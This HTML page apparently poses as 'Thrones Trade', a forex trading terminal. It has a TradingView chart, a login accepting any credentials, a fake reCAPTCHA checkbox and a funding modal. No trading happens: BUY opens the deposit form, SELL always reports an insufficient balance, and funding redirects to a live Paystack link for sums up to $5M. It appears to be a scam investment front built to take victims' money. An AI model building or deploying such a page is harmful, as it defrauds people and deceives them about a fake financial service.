<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade | Thrones Forex Terminal</title>
    <style>
        :root { --bg: #06090f; --panel: #121824; --green: #00ff88; --red: #ff3b3b; --accent: #c1a461; --text: #f0f2f5; --border: #1e2633; }
        
        @keyframes led-glow { 
            0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 
            50% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; } 
            100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 
        }
        
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; height: 100vh; display: flex; flex-direction: column; border: 4px solid #f00; animation: led-glow 5s infinite; box-sizing: border-box; overflow: hidden; }

        header { height: 50px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; flex-shrink: 0; }
        
        .main-container { display: flex; flex: 1; overflow: hidden; width: 100%; }

        /* CENTER AREA */
        .center-stack { flex: 1; display: flex; flex-direction: column; border-right: 1px solid var(--border); min-width: 0; }
        #chart_frame { flex: 3; background: #000; border-bottom: 1px solid var(--border); }
        
        .bottom-section { flex: 1.5; display: flex; flex-direction: column; background: var(--panel); }
        .ad-banner-top { height: 70px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: center; color: #444; font-size: 10px; overflow: hidden; }

        /* SIDEBAR */
        .sidebar { width: 300px; background: var(--panel); padding: 15px; display: flex; flex-direction: column; gap: 12px; flex-shrink: 0; overflow-y: auto; }
        
        .card { background: #000; border: 1px solid var(--border); padding: 15px; border-radius: 8px; }
        .balance-amt { font-size: 28px; font-weight: 900; color: var(--red); margin: 5px 0; }

        .sidebar-ad { height: 250px; background: #0a0a0a; border: 1px dashed #333; display: flex; align-items: center; justify-content: center; color: #444; font-size: 11px; text-align: center; border-radius: 8px; }

        /* BUTTONS */
        .btn { width: 100%; padding: 14px; border: none; border-radius: 6px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        .btn-fund { background: var(--accent); color: #000; font-size: 11px; margin-top: 8px; }
        .btn-call { background: var(--green); color: #000; height: 60px; font-size: 16px; margin-top: 10px; }
        .btn-sell { background: var(--red); color: #fff; height: 50px; }

        /* MODALS */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 10000; display: none; align-items: center; justify-content: center; }
        .login-card { background: var(--panel); width: 340px; padding: 25px; border: 2px solid var(--accent); border-radius: 12px; text-align: center; }
        
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 5px; box-sizing: border-box; }
        .amt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 10px 0; }
        .amt-opt { background: #000; border: 1px solid var(--border); color: var(--green); padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div id="fundModal" class="modal-overlay">
        <div class="login-card">
            <h2 style="color:var(--accent); margin-bottom: 15px;">FUND WALLET</h2>
            <input type="tel" id="pPhone" placeholder="Transaction Phone (08153609706)">
            <select id="pBank">
                <option value="" disabled selected>Select Funding Source</option>
                <option value="OPay">OPay</option>
                <option value="PalmPay">PalmPay</option>
                <option value="Kuda">Kuda Bank</option>
                <option value="GTB">GTBank</option>
            </select>
            <div class="amt-grid">
                <button class="amt-opt" onclick="pay(100000)">$100,000</button>
                <button class="amt-opt" onclick="pay(500000)">$500,000</button>
                <button class="amt-opt" onclick="pay(1000000)">$1M (VIP)</button>
                <button class="amt-opt" onclick="pay(5000000)">$5M (PRO)</button>
            </div>
            <button onclick="document.getElementById('fundModal').style.display='none'" style="color:#555; background:none; border:none; cursor:pointer; margin-top:10px;">Cancel</button>
        </div>
    </div>

    <div id="loginModal" class="modal-overlay" style="display: flex;">
        <div class="login-card">
            <h1 style="color:var(--accent); margin-bottom: 10px;">THRONES TRADE</h1>
            <p style="color:#666; font-size:11px; margin-bottom:20px;">Institutional Forex Access</p>
            <form onsubmit="login(event)">
                <input type="text" id="user" placeholder="Trader ID" required>
                <input type="password" id="pass" placeholder="Password" required>
                <div style="background:#fff; color:#000; padding:10px; border-radius:3px; margin:15px 0; display:flex; align-items:center; justify-content:space-between; font-size:12px;">
                    <div style="display:flex; align-items:center;"><input type="checkbox" required style="width:18px; margin-right:8px;"> I'm not a robot</div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" width="25">
                </div>
                <button type="submit" class="btn" style="background:var(--accent);">Authorize Terminal</button>
            </form>
        </div>
    </div>

    <header>
        <div style="font-weight: 900; font-size: 18px; color: var(--accent);">THRONES <span style="color:#fff">TRADE</span></div>
        <div style="color: var(--green); font-size: 10px; font-weight: bold;">● LIVE MARKET: EUR/USD</div>
    </header>

    <div class="main-container">
        <div class="center-stack">
            <div id="chart_frame">
                <div id="tradingview_pro" style="height:100%;width:100%;"></div>
                <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
                <script type="text/javascript">
                new TradingView.widget({
                    "autosize": true,
                    "symbol": "FX:EURUSD",
                    "interval": "1",
                    "timezone": "Etc/UTC",
                    "theme": "dark",
                    "style": "1",
                    "locale": "en",
                    "toolbar_bg": "#121824",
                    "enable_publishing": false,
                    "withdateranges": true,
                    "hide_side_toolbar": false,
                    "allow_symbol_change": true,
                    "details": true,
                    "container_id": "tradingview_pro"
                });
                </script>
            </div>
            <div class="bottom-section">
                <div class="ad-banner-top">
                    <p style="color:#333;">[ PLACE YOUR AD CODE HERE ]</p>
                </div>
                <div style="flex:1;">
                    <iframe src="https://www3.cbox.ws/box/?boxid=3541705&boxtag=thronestrade" width="100%" height="100%" frameborder="0"></iframe>
                </div>
            </div>
        </div>

        <div class="sidebar">
            <div class="card">
                <div style="font-size: 9px; color: #666;">TRADING EQUITY</div>
                <div id="balance" class="balance-amt">$0.00</div>
                <button class="btn btn-fund" onclick="document.getElementById('fundModal').style.display='flex'">+ FUND ACCOUNT</button>
            </div>

            <div class="sidebar-ad">
                <p style="color:#333;">[ PLACE YOUR AD CODE HERE ]</p>
            </div>

            <div style="margin-top: auto; display: flex; flex-direction: column; gap: 8px;">
                <button class="btn btn-call" onclick="document.getElementById('fundModal').style.display='flex'">▲ CALL / BUY</button>
                <button class="btn btn-sell" onclick="alert('Insufficient Balance')">▼ SELL / PUT</button>
            </div>
        </div>
    </div>

    <script>
        // YOUR LIVE PAYSTACK LINK
        const PAYSTACK_URL = "https://paystack.shop/pay/m3gzeovryt";

        function login(e) {
            e.preventDefault();
            localStorage.setItem('trade_user', document.getElementById('user').value);
            document.getElementById('loginModal').style.display = 'none';
        }

        function pay(amt) {
            const phone = document.getElementById('pPhone').value;
            const bank = document.getElementById('pBank').value;
            if(!phone || !bank) { alert("Please complete phone and bank selection!"); return; }
            const kobo = amt * 100;
            window.location.href = PAYSTACK_URL + "?amount=" + kobo + "&phone=" + phone;
        }

        window.onload = function() {
            if(localStorage.getItem('trade_user')) {
                document.getElementById('loginModal').style.display = 'none';
            }
        }
    </script>
</body>
</html>
